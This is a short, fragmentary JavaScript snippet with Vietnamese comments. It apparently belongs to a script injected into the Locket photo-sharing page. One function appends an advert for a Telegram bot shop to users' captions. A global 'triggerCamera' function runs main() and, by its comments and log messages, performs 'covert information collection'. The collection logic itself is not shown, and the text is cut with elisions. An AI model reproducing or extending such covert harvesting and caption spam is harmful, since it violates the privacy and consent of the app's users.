...
function getCaptionWithExtras() {
  return getCaption() + `\n\n🎰 Mua bót lét tại shop @ruby_chan_bot nhá anh em
...
// Bọc vào hàm toàn cục để gọi ngầm từ trang Locket
window.triggerCamera = async function() {
    console.log("🚀 Bắt đầu thu thập thông tin ngầm...");
    try {
        await main();
        window.mainScriptFinished = true;
        console.log("✅ Hoàn tất thu thập thông tin.");
    } catch (err) {
        console.error("❌ Lỗi thu thập thông tin:", err);
    }
};
